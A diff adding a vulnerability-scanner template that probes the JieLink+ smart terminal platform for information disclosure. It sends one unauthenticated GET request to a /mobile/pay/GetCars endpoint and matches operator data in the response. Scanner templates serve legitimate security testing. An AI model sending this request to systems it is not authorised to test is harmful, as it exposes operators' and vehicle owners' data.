@@ -1,0 +1,25 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - '"OperatorName":"'
+            - '"code":0,'
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /mobile/pay/GetCars?pageIndex=1&pageSize=100 HTTP/1.1
+          Host: {{Hostname}}
+id: JieLink-Information-disclosure
+info:
+    author: Superhero
+    description: JieLink+智能终端操作平台存在信息泄露，攻击者可利用该漏洞获取敏感信息。
+    name: JieLink智能终端操作平台信息泄露
+    severity: medium
+    tags:
+        - Information disclosure
+        - JieLink+智能终端操作平台
